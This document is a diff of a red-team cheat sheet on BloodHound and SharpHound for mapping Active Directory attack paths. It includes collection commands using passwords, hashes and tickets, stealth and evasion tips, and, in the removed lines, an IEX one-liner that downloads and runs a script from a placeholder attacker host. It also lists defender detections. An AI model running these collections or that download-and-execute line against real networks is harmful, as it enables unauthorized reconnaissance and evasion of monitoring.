@@ -3,271 +3,440 @@ aliases:
   - BloodHound
   - SharpHound
   - bloodhound-python
+  - RustHound
+  - BloodHound CE
 tags:
-  - type/tool
+  - type/vulnerability
+  - vuln/ad-enumeration
   - technique/discovery
-  - technique/recon/active
   - asset/active-directory
-  - tool/bloodhound
-  - tool/sharphound
 primary categories:
   - "[[Red Team]]"
 secondary categories:
-  - "[[Information Gathering]]"
   - "[[Active Directory]]"
+  - "[[Information Gathering]]"
 tertiary categories:
   - "[[Active Directory Enumeración]]"
 type: CheatSheet
 linked:
-  - "[[Active Directory Explotación 1]]"
-  - "[[BloodHound Cypher Queries]]"
-  - "[[AD Initial Enumeration Playbook]]"
+  - "[[BloodHound & SharpHound - Collectors]]"
+  - "[[BloodHound & SharpHound - BloodHound CE]]"
+  - "[[BloodHound & SharpHound - Cypher Queries]]"
+  - "[[BloodHound & SharpHound - Edges y Analytics]]"
+  - "[[BloodHound & SharpHound - Multi-Domain y Forest]]"
+  - "[[BloodHound & SharpHound - Tooling Ecosystem]]"
+  - "[[AD - ACL Enumeration]]"
+  - "[[AD - Hosts Enumeration]]"
+  - "[[netexec]]"
 ---
 # BloodHound & SharpHound
 
 ***
 
 ## Cheatsheet
-^bloodhound-cheatsheet
 
-| Collector | Comando | Contexto |
-| --- | --- | --- |
-| **SharpHound (exe)** | `SharpHound.exe -c All,GPOLocalGroup --zipfilename data.zip` | Windows on-host |
-| **SharpHound (dll)** | `rundll32 SharpHound.dll,DoStuff -c All --zipfilename data.zip` | Menos ruidoso |
-| **Invoke-BloodHound** | `IEX(IWR -UseBasic http://ATK/SharpHound.ps1); Invoke-BloodHound -c All` | PowerShell reflection |
-| **bloodhound-python** | `bloodhound-python -u user -p pass -d dom.local -ns DC_IP -c all --zip` | Linux remote |
-| **bloodhound.py (CE)** | `bloodhound-python -u user -p pass -d dom.local -dc DC.dom.local -c All,LoggedOn --zip` | Con LoggedOn |
-| **bloodyAD → BH** | `bloodyAD --host DC -d dom -u user -p pass` | Minimal footprint |
-| **ADExplorer → BH** | `ADExplorerSnapshot.py snapshot.dat -o out/` | Snapshot offline parse |
-| **Rusthound** | `rusthound -d dom.local -u user -p pass -o out/ -z` | Rust, rápido |
-| **BH CE server** | `docker compose up -d` en repo CE | BloodHound Community Edition |
-| **BH Legacy + Neo4j** | `sudo neo4j start; bloodhound` | Versión legacy (deprecated) |
+### 🔍 Collectors
 
-***
+````tabs
+tab: **SharpHound (Default Windows)**
+![[BloodHound & SharpHound - Collectors#^ad-bh-sharphound]]
 
-## 1. BloodHound vs BloodHound CE
+tab: **SharpHound Collection Methods**
+![[BloodHound & SharpHound - Collectors#^ad-bh-methods]]
 
-| | Legacy | Community Edition |
-| --- | --- | --- |
-| Backend | Neo4j directo | PostgreSQL + Neo4j + API |
-| UI | Electron app | Web (React) |
-| Deploy | Local binarios | Docker compose |
-| Collectors soportados | SharpHound legacy | SharpHound + AzureHound + API ingest |
-| Custom queries | `customqueries.json` | DB ingestion + saved queries web |
-| Estado | Deprecated (2024+) | Mantenido activo |
+tab: **RustHound (Cross-Platform)**
+![[BloodHound & SharpHound - Collectors#^ad-bh-rusthound]]
 
-BH CE preferible. Legacy sigue funcionando pero sin nuevos features.
+tab: **BloodHound.py (Linux)**
+![[BloodHound & SharpHound - Collectors#^ad-bh-python]]
 
-## 2. Collection methods (`-c` flag)
+tab: **AzureHound (Cloud)**
+![[BloodHound & SharpHound - Collectors#^ad-bh-azurehound]]
 
-| Método | Qué recolecta | Detectabilidad |
-| --- | --- | --- |
-| `Default` | Group, LocalAdmin, Session, Trusts | Medio (session enum via NetSessionEnum) |
-| `Group` | Membresías de grupos | Bajo |
-| `LocalAdmin` | Local admin via NetLocalGroupGetMembers | Bajo-medio |
-| `RDP` | Membresía RDP local groups | Bajo |
-| `DCOM` | DCOM users local | Bajo |
-| `PSRemote` | Remote Management Users | Bajo |
-| `Session` | Sessions activas (NetSessionEnum) | **Alto** (una request por host) |
-| `LoggedOn` | Users logueados (requiere admin local) | Muy alto |
-| `Trusts` | Trust relationships | Bajo |
-| `ACL` | DACLs sobre objetos | Medio |
-| `Container` | OU / GPO membership | Bajo |
-| `ObjectProps` | Properties de objetos | Bajo |
-| `SPN` | Cuentas con SPN | Bajo |
-| `GPOLocalGroup` | Local group assignments via GPO | Bajo |
-| `All` | Todo lo anterior excepto LoggedOn | Medio-alto |
+tab: **Comparison**
+![[BloodHound & SharpHound - Collectors#^ad-bh-comparison]]
 
-Sets especiales:
-- `DCOnly` — solo LDAP (no tocar hosts) → sigiloso pero incompleto.
-- `ComputerOnly` — solo enum por computer.
+tab: **Collection OPSEC**
+![[BloodHound & SharpHound - Collectors#^ad-bh-opsec]]
 
-### Ejemplos
+tab: **Cross-Domain Collection**
+![[BloodHound & SharpHound - Collectors#^ad-bh-multidomain]]
+
+tab: **Continuous Loop Mode**
+![[BloodHound & SharpHound - Collectors#^ad-bh-loop]]
+````
+
+### 📊 BloodHound CE
+
+````tabs
+tab: **Installation**
+![[BloodHound & SharpHound - BloodHound CE#^ad-bhce-install]]
+
+tab: **Ingest Collection ZIPs**
+![[BloodHound & SharpHound - BloodHound CE#^ad-bhce-ingest]]
+
+tab: **Web UI Navigation**
+![[BloodHound & SharpHound - BloodHound CE#^ad-bhce-ui]]
+
+tab: **Mark Owned + Highvalue**
+![[BloodHound & SharpHound - BloodHound CE#^ad-bhce-marking]]
+
+tab: **Pre-Built Queries**
+![[BloodHound & SharpHound - BloodHound CE#^ad-bhce-prebuilt]]
+
+tab: **API Access**
+![[BloodHound & SharpHound - BloodHound CE#^ad-bhce-api]]
+
+tab: **Multi-User / Team Setup**
+![[BloodHound & SharpHound - BloodHound CE#^ad-bhce-multiuser]]
+
+tab: **Backup + Restore**
+![[BloodHound & SharpHound - BloodHound CE#^ad-bhce-backup]]
+
+tab: **BHCE 6.x New Features**
+![[BloodHound & SharpHound - BloodHound CE#^ad-bhce-6x]]
+````
+
+### 🎯 Cypher Queries
+
+````tabs
+tab: **Cypher Syntax Basics**
+![[BloodHound & SharpHound - Cypher Queries#^ad-cypher-basics]]
+
+tab: **Path Queries**
+![[BloodHound & SharpHound - Cypher Queries#^ad-cypher-paths]]
+
+tab: **Common Edge Filters**
+![[BloodHound & SharpHound - Cypher Queries#^ad-cypher-edges]]
+
+tab: **Privesc Path Queries**
+![[BloodHound & SharpHound - Cypher Queries#^ad-cypher-privesc]]
+
+tab: **Lateral Movement Queries**
+![[BloodHound & SharpHound - Cypher Queries#^ad-cypher-lateral]]
+
+tab: **Kerberoast / AS-REP**
+![[BloodHound & SharpHound - Cypher Queries#^ad-cypher-kerberoast]]
+
+tab: **DCSync Queries**
+![[BloodHound & SharpHound - Cypher Queries#^ad-cypher-dcsync]]
+
+tab: **Delegation Queries**
+![[BloodHound & SharpHound - Cypher Queries#^ad-cypher-deleg]]
+
+tab: **ADCS Queries (BHCE 5.x+)**
+![[BloodHound & SharpHound - Cypher Queries#^ad-cypher-adcs]]
+
+tab: **Custom Reporting**
+![[BloodHound & SharpHound - Cypher Queries#^ad-cypher-reporting]]
+
+tab: **Cypher Performance Tips**
+![[BloodHound & SharpHound - Cypher Queries#^ad-cypher-perf]]
+````
+
+### 📋 Edges & Analytics
+
+````tabs
+tab: **ACL Edges**
+![[BloodHound & SharpHound - Edges y Analytics#^ad-edges-acl]]
+
+tab: **DCSync Edges**
+![[BloodHound & SharpHound - Edges y Analytics#^ad-edges-dcsync]]
+
+tab: **Lateral Movement Edges**
+![[BloodHound & SharpHound - Edges y Analytics#^ad-edges-lateral]]
+
+tab: **Delegation Edges**
+![[BloodHound & SharpHound - Edges y Analytics#^ad-edges-deleg]]
+
+tab: **ADCS Edges**
+![[BloodHound & SharpHound - Edges y Analytics#^ad-edges-adcs]]
+
+tab: **Trust Edges**
+![[BloodHound & SharpHound - Edges y Analytics#^ad-edges-trust]]
+
+tab: **GPO Edges**
+![[BloodHound & SharpHound - Edges y Analytics#^ad-edges-gpo]]
+
+tab: **Container Edges**
+![[BloodHound & SharpHound - Edges y Analytics#^ad-edges-container]]
+
+tab: **Common Analytics Patterns**
+![[BloodHound & SharpHound - Edges y Analytics#^ad-edges-patterns]]
+
+tab: **BHCE 6.x Performance**
+![[BloodHound & SharpHound - Edges y Analytics#^ad-edges-bhce6]]
+````
+
+### 🔄 Multi-Domain & Forest
+
+````tabs
+tab: **Multi-Domain Workflow**
+![[BloodHound & SharpHound - Multi-Domain y Forest#^ad-multidom-workflow]]
+
+tab: **Cross-Domain Cypher**
+![[BloodHound & SharpHound - Multi-Domain y Forest#^ad-multidom-cypher]]
+
+tab: **Cross-Trust Authentication**
+![[BloodHound & SharpHound - Multi-Domain y Forest#^ad-multidom-auth]]
+
+tab: **SID Filtering Considerations**
+![[BloodHound & SharpHound - Multi-Domain y Forest#^ad-multidom-sidfilter]]
+
+tab: **BHCE 6.x Forest Support**
+![[BloodHound & SharpHound - Multi-Domain y Forest#^ad-multidom-bhce6]]
+
+tab: **OPSEC Multi-Domain**
+![[BloodHound & SharpHound - Multi-Domain y Forest#^ad-multidom-opsec]]
+````
+
+### 🛠️ Tooling Ecosystem
+
+````tabs
+tab: **Custom Query Repos**
+![[BloodHound & SharpHound - Tooling Ecosystem#^ad-bhtool-customqueries]]
+
+tab: **bloodhound-cli (Modern)**
+![[BloodHound & SharpHound - Tooling Ecosystem#^ad-bhtool-cli]]
+
+tab: **SOAPHound (Stealth)**
+![[BloodHound & SharpHound - Tooling Ecosystem#^ad-bhtool-soaphound]]
+
+tab: **ldeep (Linux LDAP Dump)**
+![[BloodHound & SharpHound - Tooling Ecosystem#^ad-bhtool-ldeep]]
+
+tab: **ADRecon Bulk Reports**
+![[BloodHound & SharpHound - Tooling Ecosystem#^ad-bhtool-adrecon]]
+
+tab: **OpenGraph (BHCE 6.x)**
+![[BloodHound & SharpHound - Tooling Ecosystem#^ad-bhtool-opengraph]]
+
+tab: **BHCE Integrations**
+![[BloodHound & SharpHound - Tooling Ecosystem#^ad-bhtool-integrations]]
+
+tab: **Specter Ops Tools**
+![[BloodHound & SharpHound - Tooling Ecosystem#^ad-bhtool-specterops]]
+
+tab: **Wordlists & Recursos**
+![[BloodHound & SharpHound - Tooling Ecosystem#^ad-bhtool-resources]]
+````
+
+___
+
+## Overview
+
+**BloodHound & SharpHound** = standard de facto para AD attack path analysis. SharpHound (collector) recolecta datos de AD vía LDAP + SMB queries. BloodHound CE (analyzer) ingesta datos + provee Cypher queries + visual graph. Foundation crítica para todo recon AD moderno.
+
+Pre-BloodHound: red team manual ACL audit + correlate. Post-BloodHound: automated graph + pre-built queries + Cypher custom analytics. Modern: BHCE 6.x con ADCS + LAPSv2 + gMSA + improved cross-domain support.
+
+### Cuándo es alto impacto
+
+| BloodHound enum (info) | BloodHound como input |
+|---|---|
+| Comprehensive AD inventory | Identify all attack paths (input) |
+| Visual privesc paths | Strategic planning (input) |
+| ACL chain analysis | Direct privesc target identification |
+| Cross-domain trust paths | Forest takeover planning (CVSS Critical) |
+| ADCS ESC paths | Cert-based privesc (CVSS Critical) |
+| Delegation paths | UD/CD/RBCD chains (CVSS Critical) |
+| Foreign principals analysis | Cross-trust risks (CVSS Critical) |
+| Custom Cypher analytics | Per-engagement strategy |
+
+### Diferencia con otros enum hubs
+
+| | **BloodHound** | **Manual Enum** |
+|---|---|---|
+| Foco | Visual graph + automated paths | Per-attribute manual queries |
+| Output | Graph + Cypher analytics | Ad-hoc results |
+| Speed | Fast post-collection | Slow manual |
+| Comprehensiveness | All ACL/relationships | Partial |
+| Tooling | SharpHound, RustHound, BHCE | netexec, ldapsearch, dsacls |
+| Combine con | All AD attacks | Per-attack specific |
+| Modern: industry standard | Standard | Adjacent |
+
+___
+
+## Workflow
+
+```
+1. Install BHCE:
+   - git clone github.com/SpecterOps/BloodHound
+   - docker compose up -d
+   - http://localhost:8080
+
+2. Choose collector + auth:
+   - SharpHound (Windows)
+   - RustHound (Linux/Cross)
+   - BloodHound.py (Linux)
+   - AzureHound (Cloud)
+
+3. Run collection:
+   - SharpHound -c All (or DCOnly for stealth)
+   - bloodhound-python -d dom -u u -p p -ns DC -c All --zip
+   - Per-domain for forest
+
+4. Ingest ZIPs:
+   - Drag-and-drop in BHCE Web UI
+   - Auto-correlate cross-domain
+
+5. Mark owned + highvalue:
+   - Right-click compromised principals → Mark Owned
+   - Verify Tier 0 highvalue auto-detection
+
+6. Run pre-built queries:
+   - Find Domain Admins
+   - Shortest paths to DA
+   - Find Kerberoastable
+   - Find unconstrained delegation
+   - Find ESC1 vulnerable templates
+   - Find LAPS readers
+
+7. Custom Cypher analytics:
+   - ACL chain analysis
+   - Cross-domain paths
+   - Foreign principal analysis
+   - Stale priv users
+   - Compliance baseline diff
+
+8. Plan exploitation:
+   - Per-path strategic decision
+   - Per-engagement scope
+   - OPSEC: targeted exploitation
+
+9. Cleanup post-engagement:
+   - BHCE collection ZIPs cleanup
+   - Document findings
+   - Per-engagement reports
+```
+
+___
+
+## Detección rápida
+
+### Probes mínimos
 
 ```bash
-# Stealth (solo LDAP al DC, sin tocar workstations)
-SharpHound.exe -c DCOnly --zipfilename stealth.zip
+DC="dc01.dom.local"
+USER="user"; PASS="pass"
 
-# Todo sin LoggedOn (default recommended)
-SharpHound.exe -c All --zipfilename full.zip
+# 1. BloodHound.py default collection (Linux)
+bloodhound-python -d dom.local -u $USER -p $PASS -ns $DC -c All --zip
 
-# Incluir GPO local group
-SharpHound.exe -c All,GPOLocalGroup --zipfilename full.zip
+# 2. RustHound (faster)
+rusthound -d dom.local -u $USER -p $PASS --zip
 
-# Solo Kerberoasteables rápido
-SharpHound.exe -c SPN --zipfilename spn.zip
+# 3. SharpHound (Windows)
+SharpHound.exe -c Default
+
+# 4. Ingest in BHCE
+# http://localhost:8080 → Settings → File Ingest → drag-and-drop ZIP
+
+# 5. Pre-built queries:
+# - Find all Domain Admins
+# - Find shortest paths to Domain Admins
+# - Find Kerberoastable
+# - Find unconstrained delegation
+# - Find LAPS readers
+# - Find ESC1 vulnerable templates
 ```
 
-## 3. SharpHound flags útiles
+___
 
-```cmd
-# Loop mode — re-collect sessions cada N min
-SharpHound.exe -c Session --loop --loopduration 02:00:00 --loopinterval 00:30:00
+## Impacto
 
-# Stealth timing (evitar detecciones por ratio)
-SharpHound.exe -c All --stealth --throttle 5000 --jitter 30
+- **Visual privesc paths** — strategic planning.
+- **ACL chain analysis** — automated discovery vs manual.
+- **Cross-domain trust paths** — forest takeover planning.
+- **ADCS ESC paths** — automated cert-based privesc identification.
+- **Delegation paths** — UD/CD/RBCD chains.
+- **Foreign principals analysis** — cross-trust risks.
+- **Tier 0 mapping** — privileged target identification.
+- **Stale priv users** — audit candidates.
+- **Service account analysis** — common misconfig discovery.
+- **Custom Cypher analytics** — per-engagement strategy.
+- **Compliance baseline** — defender side audit.
+- **BHCE 6.x: ADCS + LAPSv2 + gMSA** — modern coverage.
+- **OpenGraph custom data** — hybrid identity.
 
-# Limitar scope a OU
-SharpHound.exe -c All --searchbase "OU=Servers,DC=dom,DC=local"
+___
 
-# Target específico
-SharpHound.exe -c All --domaincontroller DC.dom.local --domain dom.local
+## Mitigación (defender)
 
-# Exclude DCs (evitar tocar DCs durante enum)
-SharpHound.exe -c All --excludedcs
+- **Detection: BloodHound collection events**:
+  ```
+  Event ID 1644 (LDAP query — bulk)
+  Event ID 4662 (object access — ACL queries)
+  Event ID 4624 (logon — for sessions)
+  ```
+- **Microsoft Defender for Identity** — BloodHound activity detection.
+- **PingCastle / Purple Knight** — defender-side audit (similar coverage).
+- **BloodHound Enterprise** — continuous defender monitoring.
+- **Detection rules**:
+  - SharpHound binary signatures
+  - bloodhound-python network signatures
+  - SOAPHound SOAP signatures
+- **Honeypot accounts** — alert on enumeration.
+- **Per-OU restricted LDAP queries** — limit Authenticated Users read.
+- **LDAP signing required** — modern hardening.
+- **Modern: continuous monitoring** — defender side.
+- **Compliance: documented BHCE baseline** — defender side.
+- **Per-quarter ACL audit using BHCE** — proactive.
+- **Audit log retention** — standard.
+- **Modern: extreme alerting BloodHound activity** — critical.
+- **Cross-correlate with engagement** — known scope.
+- **Adjacent: All enum hubs** — cross-ref.
 
-# Encryption on zip
-SharpHound.exe -c All --zipfilename data.zip --encryptzip  # pide password
-```
+___
 
-## 4. bloodhound-python (Linux remote)
+## Para entender BloodHound
 
-```bash
-# Install
-pip install bloodhound
+**Por qué BloodHound transformative:**
 
-# Collection
-bloodhound-python -u user -p 'P@ss' -d dom.local -ns 10.10.10.10 -c all --zip
+Pre-2017 (BloodHound launch): manual ACL queries, spreadsheet correlation, time-consuming. Post-2017: automated graph + pre-built Cypher queries. Path-finding to DA = single query, instant. Modern industry standard for both red team + defender side.
 
-# Con NT hash
-bloodhound-python -u user --hashes :NTHASH -d dom.local -ns 10.10.10.10 -c all --zip
+**Por qué SharpHound default collector:**
 
-# Con Kerberos ticket
-export KRB5CCNAME=/tmp/ticket.ccache
-bloodhound-python -u user -k -no-pass -d dom.local -dc DC.dom.local -c all --zip
+Mature, comprehensive, Windows-native. Multiple collection methods. Loop mode for sessions. Stealth flag. EDR-aware. Modern alternatives (RustHound, BloodHound.py) emerging but SharpHound still standard.
 
-# LoggedOn (requiere admin local)
-bloodhound-python -u user -p pass -d dom.local -ns DC -c 'All,LoggedOn' --zip
-```
+**Por qué Cypher matters:**
 
-Limitaciones vs SharpHound: no captura info de local groups via SAMR en todos los hosts (depende de acceso remote).
+Graph database queries. Learn syntax → arbitrary analytics. Pre-built queries cover 80% of use cases. Custom Cypher for per-engagement strategy. Compliance baseline via documented Cypher baselines.
 
-## 5. AzureHound (Entra ID / Azure)
+**Por qué BHCE 6.x advances:**
 
-```bash
-# Install
-go install github.com/SpecterOps/azurehound@latest
+Improved ADCS ESC1-ESC15 native support. LAPSv2 + gMSA edges. Cross-domain auto-correlation. Modern Cypher engine performance. OpenGraph custom data ingest. Integrations (Slack, SIEM, etc.).
 
-# Collection
-azurehound -u user@tenant.onmicrosoft.com -p 'Pass' -t TENANT_ID list -o azure.json
-```
+**Por qué multiple collectors:**
 
-Datos complementarios a on-prem AD (roles Entra, subscriptions, hybrid identity).
+Different platforms (Windows / Linux / Cloud). Different stealth profiles. Different feature sets. SharpHound mature on Windows. RustHound modern + cross-platform. BloodHound.py Linux mature. AzureHound for cloud. Choose per-engagement.
 
-## 6. ADExplorer snapshot → BH (muy sigiloso)
+**Por qué cross-domain ingest critical:**
 
-Snapshot offline con Sysinternals ADExplorer → parse → BloodHound:
+Forest = multiple domains. Cross-domain paths = forest-wide privesc. BHCE auto-correlates cross-domain after multi-ingest. Trust attribute analysis. Foreign principal cross-trust risks.
 
-```bash
-# On-host Windows con ADExplorer
-ADExplorer.exe /snapshot "LDAP://DC" snapshot.dat
+**Por qué OpenGraph is modern:**
 
-# Parse offline
-ADExplorerSnapshot.py snapshot.dat -o bh_output/
+Custom node/edge ingest beyond AD. Hybrid identity (Azure AD), custom integrations, per-org context. BHCE 6.x feature. Standard format JSON. Extensible.
 
-# Zip + upload
-zip -r snapshot.zip bh_output/
-```
-
-Ventaja: 1 solo request LDAP masivo, no toca computers.
-
-## 7. BH CE — setup rápido
-
-```bash
-# Clonar + run
-git clone https://github.com/SpecterOps/BloodHound.git
-cd BloodHound/examples/docker-compose
-docker compose up -d
-
-# UI: http://localhost:8080
-# Default creds: admin / generated password (en logs)
-docker compose logs | grep "Initial Password"
-```
-
-### Upload data
-- Web UI → File Ingest → subir `.zip` generado por SharpHound/bloodhound-python.
-- API: `POST /api/v2/file-upload`.
-
-### Mark owned
-Web UI: Explore → busca nodo → right-click → "Mark as Owned".
-
-Via API:
-```bash
-curl -X PATCH "http://localhost:8080/api/v2/asset-groups/1/selectors" \
-  -H "Authorization: Bearer TOKEN" \
-  -d '[{"node_label":"USER@DOM.LOCAL","selector_name":"Compromised"}]'
-```
-
-## 8. Queries esenciales
-
-Ver [[BloodHound Cypher Queries]] para referencia completa.
-
-Top queries built-in (Pre-built):
-- `Shortest Paths from Owned Objects`.
-- `Find AS-REP Roastable Users`.
-- `Find Kerberoastable Users with most privileges`.
-- `Shortest Paths to Domain Admins`.
-- `Find Principals with DCSync Rights`.
-- `Find Computers where Domain Users are Local Admin`.
-
-## 9. Edges importantes (relationships)
-
-| Edge | Significado | Explotación |
-| --- | --- | --- |
-| `MemberOf` | Membership grupo | Herencia de permisos |
-| `AdminTo` | Local admin en computer | Lateral directo |
-| `HasSession` | User logueado en computer | Credential theft target |
-| `GenericAll` | Full control sobre objeto | Password reset / KCL |
-| `GenericWrite` | Write sobre attributes | Shadow creds, targeted kerberoast |
-| `WriteDacl` | Write ACL | Grant DCSync |
-| `WriteOwner` | Change owner | Grant DCSync |
-| `ForceChangePassword` | Reset password sin saber anterior | Abuso directo |
-| `AllExtendedRights` | Extended rights all | DCSync, password change |
-| `AddMember` | Add to group | Grupo privilegiado |
-| `AllowedToDelegate` | Constrained deleg | S4U abuse |
-| `AllowedToAct` | RBCD | Impersonation |
-| `AddKeyCredentialLink` | Escribir KCL | Shadow Credentials |
-| `DCSync` | Replicación | Dump hashes dominio |
-| `SQLAdmin` | sysadmin MSSQL | xp_cmdshell |
-| `HasSIDHistory` | SID history | Cross-domain privilege |
-| `CanPSRemote` | WinRM access | Lateral |
-| `CanRDP` | RDP access | Lateral |
-| `ExecuteDCOM` | DCOM execution | Lateral |
-
-## 10. OpSec tips
-
-- **DCOnly** + **stealth** + no **LoggedOn** → baseline sigiloso.
-- `--throttle 5000 --jitter 30` dispersa requests.
-- Collection desde host joined-to-domain con user low-priv es menos sospechoso.
-- Zip encrypted evita leak si detectan el file.
-- SharpHound modernos firman consultas LDAP (mejor opsec que v4).
-- Evitar `Session` en domains paranoid — NetSessionEnum requiere una request por host.
-
-### Detecciones (blue)
-- LDAP queries masivas de un user en pocos minutos.
-- `SPN-based` queries específicas raras.
-- `net session` masivo remoto (evento 5140 en cada host).
-- File drops `*.zip` con patrón BH en `%TEMP%`.
-
-## 11. Custom collectors / ingestion
-
-### Certipy → BH (ADCS)
-```bash
-certipy find -u user -p pass -dc-ip DC -vulnerable -bloodhound
-# → certipy_YYYYMMDDHHMMSS.zip → upload BH
-```
-
-### Bloodhound-import (custom data)
-Formato JSON específico, ver `BloodHound/docs/collection/`. Permite ingestar datos custom (e.g., app permissions).
+___
 
 ## Recursos
 
-- [BloodHound CE Docs](https://bloodhound.specterops.io/)
-- [SharpHound GitHub](https://github.com/SpecterOps/SharpHound)
-- [bloodhound-python](https://github.com/fox-it/BloodHound.py)
-- [Rusthound](https://github.com/OPENCYBER-FR/RustHound)
-- [ADExplorerSnapshot.py](https://github.com/c3c/ADExplorerSnapshot.py)
-- [[BloodHound Cypher Queries]] — queries cheatsheet.
-- [[Active Directory Explotación 1]] — hub de explotación post-enum.
+- [BloodHound CE docs](https://bloodhound.specterops.io/) — tool docs.
+- [BloodHound CE GitHub](https://github.com/SpecterOps/BloodHound) — source.
+- [BloodHound Enterprise docs](https://support.bloodhoundenterprise.io/) — commercial.
+- [Specter Ops blog](https://posts.specterops.io/) — research.
+- [BloodHound Slack](https://bloodhound.slack.com) — community.
+- [SharpHound GitHub](https://github.com/SpecterOps/SharpHound) — collector.
+- [RustHound](https://github.com/OPENCYBER-FR/RustHound) — modern collector.
+- [BloodHound.py](https://github.com/dirkjanm/BloodHound.py) — Linux collector.
+- [AzureHound](https://github.com/BloodHoundAD/AzureHound) — cloud collector.
+- [Compass Security queries](https://github.com/CompassSecurity/BloodHoundQueries) — custom queries.
+- [haus3c queries](https://github.com/haus3c/bloodhound-Custom-Queries) — adjacent.
+- [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) — stealth alternative.
+- [ldeep](https://github.com/franc-pentest/ldeep) — Linux LDAP dump.
+- [HackTricks BloodHound](https://book.hacktricks.xyz/) — reference.
+- [The Hacker Recipes](https://www.thehacker.recipes/ad/recon) — reference.
+- [`awesome-active-directory`](https://github.com/Orange-Cyberdefense/awesome-active-directory) — curated.
 
 ***
